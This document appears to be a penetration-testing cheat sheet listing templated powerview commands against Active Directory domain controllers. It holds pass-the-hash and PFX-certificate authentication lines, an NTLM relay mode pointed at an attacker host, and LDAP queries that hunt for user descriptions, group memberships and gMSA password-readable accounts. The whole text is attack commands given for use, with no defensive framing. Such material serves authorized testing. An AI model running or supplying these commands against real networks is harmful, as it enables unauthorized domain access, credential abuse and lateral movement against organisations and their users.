# powerview

#powerview
## powerview - use
```
powerview "<domain>"/"<user>":"<password>"@"<dc_fqdn>" -k
```

## powerview - use hash
```
powerview "<domain>"/"<user>":@"<dc_ip>" -H "<nt_hash>"
```

## powerview - use pfx
```
powerview "<dc_ip>" --pfx "<pfx-file>"
```

## powerview - relay mode
```
powerview --relay --relay-host "<attacker_ip>" @<target_ip>
```

## powerview - find user description
```
powerview "<domain>"/"<user>":"<password>"@"<dc_fqdn>" -k  --query "Get-DomainUser -Where 'Description not \"\"' -Properties sAMAccountName,Description"
```

## powerview - find users
```
powerview "<domain>"/"<user>":"<password>"@"<dc_fqdn>" -k  --query "Get-DomainUser -Select sAMAccountName -OutFile <outfile|users.txt>" 
```

## powerview - find group membership
```
powerview "<domain>"/"<user>":"<password>"@"<dc_fqdn>" -k  --query "Get-DomainGroup -LDAPFilter \"(!(sAMAccountName=Denied RODC Password Replication Group))\" -Where 'member contains CN=Users' -Properties member,sAMAccountName"
```

## powerview - find gmsa
```
powerview "<domain>"/"<user>":"<password>"@"<dc_fqdn>" -k  --query "Get-ADObject -Where 'msDS-GroupMSAMembership != ''' -Properties sAMAccountName,msDS-GroupMSAMembership"
```

